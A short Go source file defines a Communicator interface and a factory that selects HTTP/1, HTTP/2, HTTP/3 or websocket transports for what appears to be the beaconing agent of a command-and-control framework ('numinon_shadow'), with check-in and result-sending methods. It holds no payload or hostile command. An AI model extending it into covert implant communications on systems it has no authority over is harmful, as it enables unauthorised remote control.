package comm

import (
	"errors"
	"fmt"
	"numinon_shadow/internal/agent/config"
)

type Communicator interface {
	Connect() error
	Disconnect() error
	CheckIn() ([]byte, error)
	SendResult(resultData []byte) error
	Type() config.AgentProtocol
}

func NewCommunicator(cfg config.AgentConfig) (Communicator, error) {

	switch cfg.Protocol {

	case config.HTTP1Clear:
		return NewHttp1ClearCommunicator(cfg)

	case config.HTTP1TLS:
		return NewHttp1TLSCommunicator(cfg)

	case config.HTTP2TLS:
		return NewHttp2TLSCommunicator(cfg)

	case config.HTTP3:
		return NewHttp3Communicator(cfg)

	case config.WebsocketClear:
		return nil, errors.New("websocket not yet supported")
		//return NewWSCommunicator(cfg)

	case config.WebsocketSecure:
		return nil, errors.New("websocket tls not yet supported")
		//return NewWSSCommunicator(cfg)

	default:
		return nil, fmt.Errorf("unknown communicator type specified: %s", cfg.Protocol)
	}
}
